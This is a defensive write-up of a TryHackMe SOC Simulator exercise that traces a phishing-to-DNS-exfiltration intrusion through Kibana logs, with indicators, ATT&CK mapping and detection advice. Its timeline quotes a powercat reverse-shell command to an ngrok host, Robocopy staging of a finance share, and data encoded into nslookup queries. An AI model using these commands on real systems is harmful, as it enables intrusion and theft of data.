# Phishing Unfolding: An Invoice Zip to DNS Exfiltration in 25 Minutes

**Platform:** TryHackMe SOC Simulator (Elastic / Kibana edition) | **Format:** Investigation, own work | **Tools:** Kibana Discover (email and Sysmon events) | **Date:** 21 September 2026 | **Verdict:** True positive, rated Critical | **Result:** 15 of 36 alerts closed as true positives, all marked correct

## Scenario

At TryHatMe, a hat retailer, 36 alerts arrived about one a minute over roughly 40 minutes. Most early ones were low-severity and looked alike: spam emails and "suspicious parent-child" process alerts. One workstation, `win-3450` (user `michael.ascot`, taken from file paths), was taken over and used to steal the finance file share. Evidence comes from Kibana searches only. I used no sandbox or reputation service, and where I read a base64 string I read it by eye without a decoder.

## The attack, in the order it happened (Kibana time)

| Time | Event |
|---|---|
| 23:40:54 | Alert 1005. Email from `john@hatmakereurope.xyz` to michael.ascot, "FINAL NOTICE: Overdue Payment - Account Suspension Imminent", attachment `ImportantInvoice-Febrary.zip` |
| 00:00:51 | `powershell.exe` looks up `raw.githubusercontent.com` and `2.tcp.ngrok.io` |
| 00:01:00 | `explorer.exe` starts PowerShell that downloads `powercat.ps1` and runs `powercat -c 2.tcp.ngrok.io -p 19282 -e powershell`, a reverse shell |
| 00:01:16 to 00:01:45 | `systeminfo`, `whoami`, `whoami /priv`, `net user`, `net localgroup` |
| 00:02:24 | Alert 1020. `PowerView.ps1` created in `C:\Users\michael.ascot\Downloads` |
| 00:04:06 | Alert 1022. `net use Z: \\FILESRV-01\SSF-FinancialRecords` |
| 00:04:53 | Alert 1023. `Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E` |
| 00:05:04 | Alert 1024. `net use Z: /delete` |
| 00:05:51 to 00:06:07 | Alerts 1025 to 1034. Ten `nslookup.exe` processes from PowerShell, each with a long encoded string in front of `haz4rdw4re.io` |

The invoice zip is the likely way in, but the logs do not show it being opened. The link is my inference from the same user, the same host and a 20-minute gap, with the shell started from `explorer.exe`, which means a user action launched it.

The DNS exfiltration is the clearest evidence of data leaving. Each `nslookup` carried a base64-style string. Several begin `UEsDB`, which is how a zip file starts in base64, and one reads as `Summary.xlsx`. One starts like `THM{`, which suggests the exercise planted a marker. I can see ten lookups carrying data, not the volume that left.

## Indicators

| Type | Indicator |
|---|---|
| Sender / domain | `john@hatmakereurope.xyz`, `hatmakereurope.xyz` |
| File | `ImportantInvoice-Febrary.zip`, `PowerView.ps1` |
| Reverse shell | `2.tcp.ngrok.io:19282` (powercat) |
| Exfiltration domain | `haz4rdw4re.io` |
| Share and staging folder | `\\FILESRV-01\SSF-FinancialRecords`, `C:\Users\michael.ascot\downloads\exfiltration` |
| Host / user | `win-3450` / `michael.ascot` |

## MITRE ATT&CK mapping

| Behaviour | Technique |
|---|---|
| Invoice zip email | T1566.001 Spearphishing Attachment (likely) |
| PowerShell reverse shell | T1059.001, T1105 Ingress Tool Transfer, T1572 Protocol Tunneling |
| Host and account discovery | T1082, T1033, T1087.001, T1069.001 |
| PowerView | T1087.002, T1069.002 |
| Share copied and staged | T1039, T1074.001 |
| Share disconnected | T1070.005 |
| `nslookup` data in DNS | T1048 Exfiltration Over Alternative Protocol |

## Left open, and why I flagged it

- `forceupdate.ps1`: an internal "Force update fix" email from yani.zubair to michelle.smith at 23:30:01. I could not link it to `win-3450`.
- `autodiscover.tryhatme.finance`: Outlook on four hosts looked up a lookalike of the company domain. No alert fired and nothing ties it to this host, but it should be checked.
- `rdpclip.exe` on `win-3450` at 23:42:06, right after the lure. I judged it routine but did not prove it.
- 21 alerts (9 spam emails, 12 routine process alerts) I judged to be noise and did not close.

## What I got wrong

My priorities were off. I spent the first half sorting spam and standard Windows alerts because they arrived first, and I closed the connected true positives in one batch. The scenario then did not finish, because two true positives were still open: the invoice email (1005) and the Robocopy alert (1023). I had filed the Robocopy alert with the routine "suspicious parent-child" alerts because it had the same rule name and a Low rating, and only read its command line when the scenario would not end. A Low rating on a rule I had mentally filed as noise cost me that time. The simulator also noted my resolve time was longer than average, and that alert 1020 took me 9.9 minutes.

## Recommendations I gave

1. Isolate `win-3450` and keep it for forensics. Reset michael.ascot's credentials and revoke sessions.
2. Block `haz4rdw4re.io` and `*.ngrok.io` at DNS and the firewall.
3. Treat every file in `SSF-FinancialRecords` as stolen until the file-server owner shows otherwise.
4. Alert on the chain, not each step: PowerShell from `explorer.exe` that downloads, then `net use`, then Robocopy, then `nslookup` with long arguments.
5. Alert on `nslookup` with long arguments and on bursts of long DNS names to one domain. Restrict PowerShell and script execution from download folders. Quarantine zip attachments from new external senders.

## Takeaway

The detection that mattered was the pattern, not any single alert. Each step looked low-severity on its own, and the Robocopy alert that copied the whole finance share was rated Low. Reading the command line, not the rule name or the severity, is what separates a routine alert from the one that moves the data.
